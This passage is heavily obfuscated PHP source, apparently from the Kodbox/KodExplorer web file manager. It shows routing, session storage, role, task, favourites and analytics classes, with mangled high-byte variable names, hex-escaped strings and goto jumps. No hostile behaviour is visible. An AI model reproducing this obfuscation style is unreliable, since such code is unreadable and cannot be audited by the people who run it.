{ return !1; } return ActionCall($_SERVER[±³—úê][1693], $ÓíÄ€™ç[$ëÆ’¾ˆü]); } public function url($—ÅëÑ·î, $ß¼‹ßÄÒ = '', $©–ùåüƒ = true) { $ÕÆö‡åé =& $_SERVER[±³—úê]; $çï¡©Í = $this->getConfig(); $ÍÁ·‡“¨ = KOD_VERSION . $ÕÆö‡åé[10] . KOD_VERSION_BUILD; $ÍŞø¯Ï„ = $this->packageVersion(); $ïşßë£ = $ÍÁ·‡“¨ . $ÕÆö‡åé[473] . $ÍŞø¯Ï„; if (substr($—ÅëÑ·î, 0, 4) == $ÕÆö‡åé[152] || substr($—ÅëÑ·î, 0, 2) == $ÕÆö‡åé[1413]) { $ø«°é¡ = $—ÅëÑ·î . $ÕÆö‡åé[1694] . $ïşßë£; } else { if ($ß¼‹ßÄÒ == $ÕÆö‡åé[12]) { $ø«°é¡ = $this->pluginHost . $—ÅëÑ·î . $ÕÆö‡åé[1694] . $ïşßë£; } else { if ($ß¼‹ßÄÒ === $ÕÆö‡åé[78]) { $ø«°é¡ = $this->pluginHost . $—ÅëÑ·î; } else { if ($ß¼‹ßÄÒ == $ÕÆö‡åé[1695]) { $ø«°é¡ = STATIC_PATH . $—ÅëÑ·î . $ÕÆö‡åé[1694] . $ÍÁ·‡“¨; } else { if ($ß¼‹ßÄÒ == $ÕÆö‡åé[1696]) { $ø«°é¡ = APP_HOST . $ÕÆö‡åé[1697] . $—ÅëÑ·î . $ÕÆö‡åé[1694] . $ÍÁ·‡“¨; } else { if (isset($çï¡©Í[$ß¼‹ßÄÒ])) { $ø«°é¡ = $çï¡©Í[$ß¼‹ßÄÒ] . $—ÅëÑ·î . $ÕÆö‡åé[1694] . $ïşßë£; } } } } } } if (!$©–ùåüƒ) { return $ø«°é¡; } echo $ø«°é¡; } public function link($‹—ùÖ° = false, $Á÷‘Öˆ³ = '') { $ıÆô£æÒ =& $_SERVER[±³—úê]; $âúãÛ« = $this->linkHas == !1; $this->linkHas = !0; if (!$‹—ùÖ°) { $this->link($ıÆô£æÒ[1698], $ıÆô£æÒ[1696]); $this->link($ıÆô£æÒ[1699], $ıÆô£æÒ[1695]); $this->link($ıÆô£æÒ[1700], $ıÆô£æÒ[1695]); $this->link($ıÆô£æÒ[1701], $ıÆô£æÒ[1695]); $this->link($ıÆô£æÒ[1702], $ıÆô£æÒ[1695]); if ($âúãÛ«) { Hook::trigger($ıÆô£æÒ[1703]); } return; } $¼¢­ËÂÓ = $this->url($‹—ùÖ°, $Á÷‘Öˆ³, !1); if (substr($‹—ùÖ°, -3) == $ıÆô£æÒ[1704]) { echo $ıÆô£æÒ[1705] . $¼¢­ËÂÓ . $ıÆô£æÒ[1706] . $ıÆô£æÒ[221]; } else { if (substr($‹—ùÖ°, -4) == $ıÆô£æÒ[1707]) { echo $ıÆô£æÒ[1708] . $¼¢­ËÂÓ . $ıÆô£æÒ[1709] . $ıÆô£æÒ[221]; } } if ($âúãÛ«) { Hook::trigger($ıÆô£æÒ[1703]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\136\57\135\53", "\x3a\156\x75\x6d" => "\x5b\60\x2d\71\x5d\53", "\x3a\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($íÅö„ŞÂ, $°Ö¥­Ö) { $Òú¥Œ´ =& $_SERVER[±³—úê]; if ($íÅö„ŞÂ == $Òú¥Œ´[1710]) { $ò·ÈÌïÅ = array_map($Òú¥Œ´[1711], $°Ö¥­Ö[0]); $‚¶¤×–š = strpos($°Ö¥­Ö[1], $Òú¥Œ´[8]) === 0 ? $°Ö¥­Ö[1] : $Òú¥Œ´[8] . $°Ö¥­Ö[1]; $²•¨ ´ = $°Ö¥­Ö[2]; } else { $ò·ÈÌïÅ = null; $‚¶¤×–š = strpos($°Ö¥­Ö[0], $Òú¥Œ´[8]) === 0 ? $°Ö¥­Ö[0] : $Òú¥Œ´[8] . $°Ö¥­Ö[0]; $²•¨ ´ = $°Ö¥­Ö[1]; } array_push(self::$maps, $ò·ÈÌïÅ); array_push(self::$routes, $‚¶¤×–š); array_push(self::$methods, strtoupper($íÅö„ŞÂ)); array_push(self::$callbacks, $²•¨ ´); } public static function error($ÊÇÑò¯†) { self::$errorCallback = $ÊÇÑò¯†; } public static function haltOnMatch($—µ¹³Ç¶ = true) { self::$halts = $—µ¹³Ç¶; } public static function dispatch() { $ì­£Ùª =& $_SERVER[±³—úê]; $èõûÔÙƒ = parse_url($_SERVER[$ì­£Ùª[1712]], PHP_URL_PATH); $£Á—ÂÀ = $_SERVER[$ì­£Ùª[164]]; $†ŸÏ´í = array_keys(static::$patterns); $ä”Æ Èº = array_values(static::$patterns); $˜ÅûÃœ» = !1; self::$routes = preg_replace($ì­£Ùª[1363], $ì­£Ùª[8], self::$routes); if (in_array($èõûÔÙƒ, self::$routes)) { $Ëİ”ƒ‡‡ = array_keys(self::$routes, $èõûÔÙƒ); foreach ($Ëİ”ƒ‡‡ as $şÀÃÆä™) { if (self::$methods[$şÀÃÆä™] == $£Á—ÂÀ || self::$methods[$şÀÃÆä™] == $ì­£Ùª[1713] || in_array($£Á—ÂÀ, self::$maps[$şÀÃÆä™])) { $˜ÅûÃœ» = !0; if (!is_object(self::$callbacks[$şÀÃÆä™])) { $É“­Îêæ = explode($ì­£Ùª[8], self::$callbacks[$şÀÃÆä™]); $˜”‹•× = end($É“­Îêæ); $”Æ»›¢• = explode($ì­£Ùª[1295], $˜”‹•×); $µÖ§¿é = new $”Æ»›¢•[0](); $µÖ§¿é->{$”Æ»›¢•[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$şÀÃÆä™]); if (self::$halts) { return; } } } } } else { $Ò—Îìƒà = 0; foreach (self::$routes as $şÀÃÆä™) { if (strpos($şÀÃÆä™, $ì­£Ùª[4]) !== !1) { $şÀÃÆä™ = str_replace($†ŸÏ´í, $ä”Æ Èº, $şÀÃÆä™); } if (preg_match($ì­£Ùª[1714] . $şÀÃÆä™ . $ì­£Ùª[1715], $èõûÔÙƒ, $¹‚¹§ÇÕ)) { if (self::$methods[$Ò—Îìƒà] == $£Á—ÂÀ || self::$methods[$Ò—Îìƒà] == $ì­£Ùª[1713] || !empty(self::$maps[$Ò—Îìƒà]) && in_array($£Á—ÂÀ, self::$maps[$Ò—Îìƒà])) { $˜ÅûÃœ» = !0; array_shift($¹‚¹§ÇÕ); if (!is_object(self::$callbacks[$Ò—Îìƒà])) { $É“­Îêæ = explode($ì­£Ùª[8], self::$callbacks[$Ò—Îìƒà]); $˜”‹•× = end($É“­Îêæ); $”Æ»›¢• = explode($ì­£Ùª[1295], $˜”‹•×); $µÖ§¿é = new $”Æ»›¢•[0](); if (!method_exists($µÖ§¿é, $”Æ»›¢•[1])) { echo $ì­£Ùª[1716]; } else { call_user_func_array(array($µÖ§¿é, $”Æ»›¢•[1]), $¹‚¹§ÇÕ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ò—Îìƒà], $¹‚¹§ÇÕ); if (self::$halts) { return; } } } } $Ò—Îìƒà++; } } if ($˜ÅûÃœ» == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÉôÁ­ß =& $_SERVER[±³—úê]; header($_SERVER[$ÉôÁ­ß[1717]] . $ÉôÁ­ß[1718]); echo $ÉôÁ­ß[1719]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ì­£Ùª[1712]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ø‘•ÚÈ =& $_SERVER[±³—úê]; static $Œ§™‚ã„ = false; if ($Œ§™‚ã„) { return $Œ§™‚ã„; } $‘êİı²­ = $GLOBALS[$Ø‘•ÚÈ[6]][$Ø‘•ÚÈ[435]]; self::$sessionTime = $‘êİı²­[$Ø‘•ÚÈ[1720]]; $ˆÆŸÖÉ” = isset($GLOBALS[$Ø‘•ÚÈ[1721]]) ? $GLOBALS[$Ø‘•ÚÈ[1721]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ˆÆŸÖÉ”)) { self::$sessionSign = Cookie::get($ˆÆŸÖÉ”); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ˆÆŸÖÉ”, self::$sessionSign, self::$sessionTime); $ŠäÌÜÓÏ = $‘êİı²­[$Ø‘•ÚÈ[1722]]; $Ù³ØÍéÚ = $‘êİı²­[$ŠäÌÜÓÏ]; $•úÚò€¡ = $‘êİı²­[$Ø‘•ÚÈ[908]]; switch ($ŠäÌÜÓÏ) { case $Ø‘•ÚÈ[21]: self::$handle = Model($Ø‘•ÚÈ[909]); break; case $Ø‘•ÚÈ[910]: self::$handle = new CacheRedis($Ù³ØÍéÚ, $•úÚò€¡); break; case $Ø‘•ÚÈ[911]: self::$handle = new CacheMemcached($Ù³ØÍéÚ, $•úÚò€¡); break; case $Ø‘•ÚÈ[242]: $Ù³ØÍéÚ[$Ø‘•ÚÈ[87]] = $Ù³ØÍéÚ[$Ø‘•ÚÈ[87]] . $Ø‘•ÚÈ[1723]; self::$handle = new CacheFile($Ù³ØÍéÚ, $•úÚò€¡); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Œ§™‚ã„ = new self(); return $Œ§™‚ã„; } public static function getBySign($ÀÉ‹Å‘À) { $²¨Şªû„ = self::$handle->get($ÀÉ‹Å‘À); $²¨Şªû„ = unserialize($²¨Şªû„); return is_array($²¨Şªû„) ? $²¨Şªû„ : array(); } public static function setBySign($µ½ËÈë†, $Ç“æ€ÊÎ) { CacheLock::lock($µ½ËÈë†); self::$handle->set($µ½ËÈë†, serialize($Ç“æ€ÊÎ), self::$sessionTime); CacheLock::unlock($µ½ËÈë†); } public static function sign($É±ù÷“² = false) { if ($É±ù÷“²) { self::$sessionSign = $É±ù÷“²; } self::init(); return self::$sessionSign; } public static function set($–¨ĞÍòå, $Ã‹ÖÒ¿ø = false) { self::init(); if (is_array($–¨ĞÍòå)) { foreach ($–¨ĞÍòå as $Ê™ÇáŒß => $½çŒ–¤•) { array_set_value(self::$data, $Ê™ÇáŒß, $½çŒ–¤•); } } else { array_set_value(self::$data, $–¨ĞÍòå, $Ã‹ÖÒ¿ø); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÔåÍ¼ˆ€ = false) { self::init(); if (!$ÔåÍ¼ˆ€) { return self::$data; } return array_get_value(self::$data, $ÔåÍ¼ˆ€); } public static function remove($Ã«¨Üë) { self::init(); unset(self::$data[$Ã«¨Üë]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[±³—úê][914])) { self::$handle->clearTimeout(); } } } goto c½¿ó¿ØÉÅ; cÇÕåìÖù·: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x72\157\x6c\145\114\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x61\165\x74\x68", "\x6c\x61\142\145\154", "\144\151\x73\x70\154\x61\x79", "\x73\x79\163\x74\x65\x6d", "\x64\x65\x73\143", "\x69\x67\156\157\162\145\x45\170\164", "\x69\147\156\x6f\x72\145\106\151\154\145\x53\151\172\x65", "\x61\x64\155\x69\156\151\163\x74\x72\141\164\x6f\162", "\x73\x6f\162\164"); public function listData($Å±îÇğ = false, $ûÛÙ…ÀÈ = "\x73\x6f\162\164", $ñš‘ƒé = false) { $µÅ¥¡’ =& $_SERVER[±³—úê]; $ÉºŞè­œ = parent::listData($Å±îÇğ, $ûÛÙ…ÀÈ, $ñš‘ƒé); if (!$Å±îÇğ) { foreach ($ÉºŞè­œ as $ßÉ¼”²Ú => $Á•¦â¿’) { if ($Á•¦â¿’[$µÅ¥¡’[2183]] == 1) { $ÉºŞè­œ[$ßÉ¼”²Ú][$µÅ¥¡’[537]] = LNG($µÅ¥¡’[2452]); } } } return $ÉºŞè­œ; } public function update($éŸÁÍ¶, $÷ºãàŒ…) { $ÕêÚ¼Ûï =& $_SERVER[±³—úê]; $‹¹Âè”¡ = parent::listData($éŸÁÍ¶); $ÔÜÁ×±¿ = $this->findByName($÷ºãàŒ…[$ÕêÚ¼Ûï[32]]); if (!$‹¹Âè”¡ || $ÔÜÁ×±¿ && $ÔÜÁ×±¿[$ÕêÚ¼Ûï[486]] != $‹¹Âè”¡[$ÕêÚ¼Ûï[486]]) { return !1; } if ($ÔÜÁ×±¿[$ÕêÚ¼Ûï[2183]] == 1) { $÷ºãàŒ… = array($ÕêÚ¼Ûï[32] => $÷ºãàŒ…[$ÕêÚ¼Ûï[32]], $ÕêÚ¼Ûï[1998] => $÷ºãàŒ…[$ÕêÚ¼Ûï[1998]]); } $this->filterAuth($÷ºãàŒ…[$ÕêÚ¼Ûï[498]]); return parent::update($éŸÁÍ¶, $÷ºãàŒ…); } public function remove($Å§‚¤’ˆ) { $Üêó³ó½ = parent::listData($Å§‚¤’ˆ); if (!$Üêó³ó½ || $Üêó³ó½[$_SERVER[±³—úê][191]]) { return !1; } return parent::remove($Å§‚¤’ˆ); } public function add($İå—ê´Ë) { $‰„÷ú“ =& $_SERVER[±³—úê]; $¤”½¿¬ = $İå—ê´Ë[$‰„÷ú“[32]]; if ($this->findByName($¤”½¿¬)) { return !1; } $£¥•–â÷ = array($‰„÷ú“[505] => $¤”½¿¬, $‰„÷ú“[1981] => $‰„÷ú“[12], $‰„÷ú“[1977] => $‰„÷ú“[1985], $‰„÷ú“[2453] => 1, $‰„÷ú“[1980] => 0, $‰„÷ú“[2454] => 0, $‰„÷ú“[1979] => $this->getSort()); $İå—ê´Ë = array_merge($£¥•–â÷, $İå—ê´Ë); $this->filterAuth($İå—ê´Ë[$‰„÷ú“[498]]); return parent::insert($İå—ê´Ë); } private function getSort() { $ì…ô =& $_SERVER[±³—úê]; $§—Â¥Ò› = parent::listData(); $ÂÇ¤´¸‹ = array_to_keyvalue($§—Â¥Ò›, $ì…ô[12], $ì…ô[1999]); return empty($ÂÇ¤´¸‹) ? 0 : max($ÂÇ¤´¸‹) + 1; } private function filterAuth(&$µ›İıå) { $ùÄÃÀò =& $_SERVER[±³—úê]; $úÌä­Å– = array(); $¥Ø¶Ñà· = array_filter(explode($ùÄÃÀò[50], $µ›İıå)); foreach ($¥Ø¶Ñà· as $µ›İıå) { $š©¾à÷À = explode($ùÄÃÀò[10], $µ›İıå); if ($š©¾à÷À[0] == $ùÄÃÀò[2455] && $š©¾à÷À[1] != $ùÄÃÀò[1277]) { $¸Ïá¨ÚÁ = $š©¾à÷À[0] . $ùÄÃÀò[10] . $š©¾à÷À[1] . $ùÄÃÀò[2456]; if (!in_array($¸Ïá¨ÚÁ, $¥Ø¶Ñà·)) { $úÌä­Å–[] = $¸Ïá¨ÚÁ; } } $úÌä­Å–[] = $µ›İıå; } $µ›İıå = implode($ùÄÃÀò[50], $úÌä­Å–); } public function findRoleDefault() { $áå‹ğÂË =& $_SERVER[±³—úê]; $²ª¡Êø = parent::listData(); $Ò®­Ä¬Ò = !1; foreach ($²ª¡Êø as $½‹ûÒ ) { if (!$½‹ûÒ  || $½‹ûÒ [$áå‹ğÂË[1997]] == $áå‹ğÂË[240] || $½‹ûÒ [$áå‹ğÂË[2183]] == 1) { continue; } if (strstr($½‹ûÒ [$áå‹ğÂË[498]], $áå‹ğÂË[2457])) { continue; } if (!strstr($½‹ûÒ [$áå‹ğÂË[498]], $áå‹ğÂË[2458])) { continue; } if (!$Ò®­Ä¬Ò) { $Ò®­Ä¬Ò = $½‹ûÒ ; continue; } $†Ñƒ¨Ğ = explode($áå‹ğÂË[50], $Ò®­Ä¬Ò[$áå‹ğÂË[498]]); $ÀšôŞõÎ = explode($áå‹ğÂË[50], $½‹ûÒ [$áå‹ğÂË[498]]); if (count($†Ñƒ¨Ğ) > count($ÀšôŞõÎ)) { $Ò®­Ä¬Ò = $½‹ûÒ ; } } return $Ò®­Ä¬Ò ? $Ò®­Ä¬Ò[$áå‹ğÂË[486]] : $áå‹ğÂË[12]; } public function sort($›å„Æä, $Èıì·Ä) { return parent::update($›å„Æä, $Èıì·Ä); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\x74\141\x73\153\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x74\171\160\145", "\x65\x76\145\156\164", "\x74\x69\x6d\x65", "\x64\145\x73\143", "\x73\x79\x73\x74\x65\155", "\145\156\x61\x62\154\145", "\x6c\x61\x73\164\122\165\x6e", "\163\x6f\162\164"); public function listData($¶‰¹Ê = false, $Çªò©˜ = "\163\157\162\x74", $ÍìÕ¥ÚÁ = false) { return parent::listData($¶‰¹Ê, $Çªò©˜, $ÍìÕ¥ÚÁ); } public function add($Åàåí³ä) { $É´Õ¬Ø =& $_SERVER[±³—úê]; $Çä’ÅäŞ = $this->findByName($Åàåí³ä[$É´Õ¬Ø[32]]); if ($Çä’ÅäŞ) { return !1; } $Åàåí³ä[$É´Õ¬Ø[1725]] = 0; $Åàåí³ä[$É´Õ¬Ø[1999]] = $this->getSort(); return parent::insert($Åàåí³ä); } private function getSort() { $”»ˆ‘é =& $_SERVER[±³—úê]; $ûõÖàç = parent::listData(); $šÎÇ¿‰  = array_to_keyvalue($ûõÖàç, $”»ˆ‘é[12], $”»ˆ‘é[1999]); return empty($šÎÇ¿‰ ) ? 0 : max($šÎÇ¿‰ ) + 1; } public function update($¸Şá­ğô, $Ä„ƒ™) { $ï³¶ÜÊÌ =& $_SERVER[±³—úê]; $åÀòõ­À = $this->listData($¸Şá­ğô); $Òš·Õ÷  = $this->findByName($Ä„ƒ™[$ï³¶ÜÊÌ[32]]); if (!$åÀòõ­À || $Òš·Õ÷  && $Òš·Õ÷ [$ï³¶ÜÊÌ[486]] != $åÀòõ­À[$ï³¶ÜÊÌ[486]]) { return !1; } return parent::update($¸Şá­ğô, $Ä„ƒ™); } public function remove($™‡Îó³å, $èĞŸÅ–Ğ = false) { $¬î„£¾£ =& $_SERVER[±³—úê]; $Ê‚‘å˜Ø = $this->listData($™‡Îó³å); if (!$Ê‚‘å˜Ø) { return; } if (!$èĞŸÅ–Ğ && $Ê‚‘å˜Ø[$¬î„£¾£[191]] == $¬î„£¾£[91]) { return !1; } return parent::remove($™‡Îó³å); } public function enable($‡¦Ÿº’Ï, $µÅÔÍÚí) { return $this->update($‡¦Ÿº’Ï, array($_SERVER[±³—úê][2447] => $µÅÔÍÚí)); } public function run($í Çïè) { return $this->update($í Çïè, array($_SERVER[±³—úê][2459] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($À¯»û Ñ) { $¶¾ê…‚ =& $_SERVER[±³—úê]; return array($¶¾ê…‚[2090] => array(USER_ID, $¶¾ê…‚[2460])); } protected function listData() { $õÃœû·ğ =& $_SERVER[±³—úê]; $¬ÔŞ™»ß = array($õÃœû·ğ[1766] => USER_ID, $õÃœû·ğ[568] => 0); $†‚¥¨¿ = $õÃœû·ğ[2461]; $îş®ê®« = $this->field($†‚¥¨¿)->where($¬ÔŞ™»ß)->order($õÃœû·ğ[2462])->select(); return $îş®ê®« ? $îş®ê®« : array(); } protected function resetCache() { } protected function listView() { $üÉ™‚› =& $_SERVER[±³—úê]; $‘†‘Ôı = $this->listData(); $À®óèè¯ = array_filter_by_field($‘†‘Ôı, $üÉ™‚›[33], $üÉ™‚›[501]); $—ØÁóëŞ = array_to_keyvalue($À®óèè¯, $üÉ™‚›[12], $üÉ™‚›[87]); if (!$—ØÁóëŞ) { return $‘†‘Ôı; } $ò¬Éòß = 2000; $ŠŞğ¶è = array($üÉ™‚›[502] => array($üÉ™‚›[503], $—ØÁóëŞ)); $ø‚Æï® = Model($üÉ™‚›[905])->listSource($ŠŞğ¶è, $ò¬Éòß); $ø‚Æï® = array_merge($ø‚Æï®[$üÉ™‚›[86]], $ø‚Æï®[$üÉ™‚›[85]]); $ø‚Æï® = array_to_keyvalue($ø‚Æï®, $üÉ™‚›[193]); foreach ($‘†‘Ôı as $Ä¾¬øš => $À¶ûûß„) { $Óš£Ì» = $ø‚Æï®[$À¶ûûß„[$üÉ™‚›[87]]]; $Óš£Ì» = $Óš£Ì» ? $Óš£Ì» : array(); $‘†‘Ôı[$Ä¾¬øš] = array_merge($Óš£Ì», $À¶ûûß„); } return $‘†‘Ôı; } protected function addFav($Ú´Æì­, $şÄÓŞÒ× = '', $£ÚÄîÓÂ = "\163\157\165\x72\143\x65") { $·ËÛ™îÀ =& $_SERVER[±³—úê]; $ÆõÒôáÏ = array($·ËÛ™îÀ[1766] => USER_ID, $·ËÛ™îÀ[568] => 0, $·ËÛ™îÀ[507] => $£ÚÄîÓÂ, $·ËÛ™îÀ[506] => $Ú´Æì­); if ($this->where($ÆõÒôáÏ)->find()) { return !1; } $ÆõÒôáÏ = array($·ËÛ™îÀ[1766] => USER_ID, $·ËÛ™îÀ[568] => 0); $çÛç°¶ = $this->where($ÆõÒôáÏ)->max($·ËÛ™îÀ[1999]); if (!$çÛç°¶) { $çÛç°¶ = 0; } if (!$şÄÓŞÒ× && $£ÚÄîÓÂ == $·ËÛ™îÀ[501]) { $—£‹ãÂØ = Model($·ËÛ™îÀ[1423])->where(array($·ËÛ™îÀ[502] => $Ú´Æì­))->find(); if (!$—£‹ãÂØ) { return !1; } $şÄÓŞÒ× = $—£‹ãÂØ[$·ËÛ™îÀ[32]]; } $şÄÓŞÒ× = $this->getAutoName($şÄÓŞÒ×); $¿ìä¬Ô = array($·ËÛ™îÀ[1766] => USER_ID, $·ËÛ™îÀ[568] => 0, $·ËÛ™îÀ[505] => $şÄÓŞÒ×, $·ËÛ™îÀ[506] => $Ú´Æì­, $·ËÛ™îÀ[507] => $£ÚÄîÓÂ, $·ËÛ™îÀ[1979] => $çÛç°¶ + 1); return $this->add($¿ìä¬Ô); } protected function remove($ïÓçÌÊÉ) { $×é´ÁÁ‚ =& $_SERVER[±³—úê]; $ö©ß‚Ï¤ = array($×é´ÁÁ‚[1766] => USER_ID, $×é´ÁÁ‚[504] => $ïÓçÌÊÉ); return $this->where($ö©ß‚Ï¤)->delete(); } protected function removeByName($º”ŞãË…) { $·¦ÍŸş =& $_SERVER[±³—úê]; $İ¦…•’ù = array($·¦ÍŸş[1766] => USER_ID, $·¦ÍŸş[505] => $º”ŞãË…, $·¦ÍŸş[568] => 0); return $this->where($İ¦…•’ù)->delete(); } protected function rename($°üŸ«û, $¹ä’¾¿ä) { $ÈÆì”á =& $_SERVER[±³—úê]; if ($°üŸ«û == $¹ä’¾¿ä) { return !1; } $ğÏé£¹ = $this->getAutoName($¹ä’¾¿ä); if ($¹ä’¾¿ä != $ğÏé£¹) { return !1; } $úŠÄóø¢ = array($ÈÆì”á[1766] => USER_ID, $ÈÆì”á[568] => 0, $ÈÆì”á[32] => $°üŸ«û); return $this->where($úŠÄóø¢)->save(array($ÈÆì”á[32] => $¹ä’¾¿ä)); } protected function resetSort($»²İ¨´«) { $ÏëÎèÂ­ =& $_SERVER[±³—úê]; $»²İ¨´« = is_array($»²İ¨´«) ? $»²İ¨´« : array(); $ìì´•ß· = array($ÏëÎèÂ­[1766] => USER_ID); for ($Ä¬éÒËå = 0; $Ä¬éÒËå < count($»²İ¨´«); $Ä¬éÒËå++) { $ìì´•ß·[$ÏëÎèÂ­[504]] = $»²İ¨´«[$Ä¬éÒËå]; $this->where($ìì´•ß·)->save(array($ÏëÎèÂ­[1979] => $Ä¬éÒËå + 1)); } return !0; } protected function moveTop($®Á®çÖç) { $„ûœÈ¡ø =& $_SERVER[±³—úê]; $í§‘³ñ¥ = array($„ûœÈ¡ø[1766] => USER_ID, $„ûœÈ¡ø[568] => 0); $ïâ€’è = $this->where($í§‘³ñ¥)->where(array($„ûœÈ¡ø[32] => $®Á®çÖç))->find(); if (!$ïâ€’è) { return; } $ÙŠñ¥ñÊ = $this->field($„ûœÈ¡ø[486])->where($í§‘³ñ¥)->order($„ûœÈ¡ø[2462])->select(); $ÙŠñ¥ñÊ = array_to_keyvalue($ÙŠñ¥ñÊ, $„ûœÈ¡ø[12], $„ûœÈ¡ø[486]); $£­Æòîù = $ÙŠñ¥ñÊ; $ÙŠñ¥ñÊ = array_remove_value($ÙŠñ¥ñÊ, $ïâ€’è[$„ûœÈ¡ø[486]]); array_unshift($ÙŠñ¥ñÊ, $ïâ€’è[$„ûœÈ¡ø[486]]); return $this->resetSort($ÙŠñ¥ñÊ); } protected function moveBottom($¶ÖË‰Ö¢) { $ÂÊ¢Ğ¬æ =& $_SERVER[±³—úê]; $úîß˜– = array($ÂÊ¢Ğ¬æ[1766] => USER_ID, $ÂÊ¢Ğ¬æ[568] => 0); $£Ì¨•¦× = $this->where($úîß˜–)->max($ÂÊ¢Ğ¬æ[1999]); $¡Ü›¹Ä÷ = array($ÂÊ¢Ğ¬æ[1999] => $£Ì¨•¦× + 1); return $this->where($úîß˜–)->where(array($ÂÊ¢Ğ¬æ[32] => $¶ÖË‰Ö¢))->save($¡Ü›¹Ä÷); } private function getAutoName($Ò´Ì·â) { $±ı»¨˜ß =& $_SERVER[±³—úê]; $ÇØ©“í‘ = array($±ı»¨˜ß[1766] => USER_ID, $±ı»¨˜ß[568] => 0); $Î½ÚßÚ« = $this->field($±ı»¨˜ß[32])->where($ÇØ©“í‘)->select(); $Î½ÚßÚ« = array_to_keyvalue($Î½ÚßÚ«, $±ı»¨˜ß[12], $±ı»¨˜ß[32]); if (!$Î½ÚßÚ« || !in_array($Ò´Ì·â, $Î½ÚßÚ«)) { return $Ò´Ì·â; } for ($œ‡Ê…éÕ = 0; $œ‡Ê…éÕ < count($Î½ÚßÚ«); $œ‡Ê…éÕ++) { if (!in_array($Ò´Ì·â . "\x28{$œ‡Ê…éÕ}\51", $Î½ÚßÚ«)) { return $Ò´Ì·â . "\x28{$œ‡Ê…éÕ}\x29"; } } return $Ò´Ì·â . "\50{$œ‡Ê…éÕ}\51"; } } goto BÁ™œñ‚ó«; D÷ÔÀÈÔó“: class AnalysisModel extends ModelBaseLight { public function init($À ˜â£¶) { $‘Ä›Äºù =& $_SERVER[±³—úê]; $©ÒïŸÒï = array($‘Ä›Äºù[676] => array($‘Ä›Äºù[33] => $‘Ä›Äºù[1903], $‘Ä›Äºù[361] => array($‘Ä›Äºù[294], $‘Ä›Äºù[845], $‘Ä›Äºù[1904], $‘Ä›Äºù[1905])), $‘Ä›Äºù[1906] => array($‘Ä›Äºù[33] => $‘Ä›Äºù[1907], $‘Ä›Äºù[361] => array($‘Ä›Äºù[294], $‘Ä›Äºù[843], $‘Ä›Äºù[1908], $‘Ä›Äºù[1909], $‘Ä›Äºù[1910]))); if (!isset($©ÒïŸÒï[$À ˜â£¶])) { return !1; } $this->optionType = $©ÒïŸÒï[$À ˜â£¶][$‘Ä›Äºù[33]]; $this->field = $©ÒïŸÒï[$À ˜â£¶][$‘Ä›Äºù[361]]; return !0; } public function listData($îïŠ®İ˜ = false, $¦ÓÙîË¨ = "\x6d\x6f\144\x69\146\171\x54\x69\155\145", $ŒÎĞ‡·Ã = false) { return parent::listData($îïŠ®İ˜, $¦ÓÙîË¨, $ŒÎĞ‡·Ã); } public function trendList($¨½¨¸•Ø) { $Ìñ–‰ÁÈ =& $_SERVER[±³—úê]; $ı¦ï½”Û = $this->listData(); if ($ı¦ï½”Û) { $Ë¹¨¹Û = end($ı¦ï½”Û); $Œåƒ”œ€ = date($Ìñ–‰ÁÈ[1911], strtotime($Ìñ–‰ÁÈ[1912])); if ($Ë¹¨¹Û[$Ìñ–‰ÁÈ[294]] == $Œåƒ”œ€) { return $ı¦ï½”Û; } $š¢ºâÔŠ = strtotime($Ë¹¨¹Û[$Ìñ–‰ÁÈ[294]]); } if (!isset($š¢ºâÔŠ)) { $åÙØú­½ = $¨½¨¸•Ø == $Ìñ–‰ÁÈ[676] ? $Ìñ–‰ÁÈ[608] : $Ìñ–‰ÁÈ[905]; $š¢ºâÔŠ = Model($åÙØú­½)->min($Ìñ–‰ÁÈ[243]); } $®£·ÀŠ = $Ìñ–‰ÁÈ[1913] . ucfirst($¨½¨¸•Ø); $ªÅ¬üéÀ = $this->dateList($š¢ºâÔŠ); foreach ($ªÅ¬üéÀ as $Œåƒ”œ€) { $this->{$®£·ÀŠ}($Œåƒ”œ€); } return $this->listData(); } private function dateList($­ı˜Öùü) { $˜ÌÜ™§Ñ =& $_SERVER[±³—úê]; $æõ™–¥° = $­ı˜Öùü; $¾şÕ±„ = strtotime($˜ÌÜ™§Ñ[1912]); $äÉ¬ØÖ¯ = array(); while ($æõ™–¥° <= $¾şÕ±„) { $äÉ¬ØÖ¯[] = date($˜ÌÜ™§Ñ[1911], $æõ™–¥°); $æõ™–¥° = strtotime($˜ÌÜ™§Ñ[1914], $æõ™–¥°); } return $äÉ¬ØÖ¯; } public function _recordUser($©ÔÒ‹¬Ë = '') { $ıÆ‡ãæ =& $_SERVER[±³—úê]; $İš÷¦ı = strtotime(date($ıÆ‡ãæ[1915], strtotime($©ÔÒ‹¬Ë))); $æø©êÎ· = strtotime(date($ıÆ‡ãæ[1916], strtotime($©ÔÒ‹¬Ë))); $Üâ‚ËøÖ = array($ıÆ‡ãæ[243] => array($ıÆ‡ãæ[1092], $æø©êÎ·)); $ú€ìÆú© = 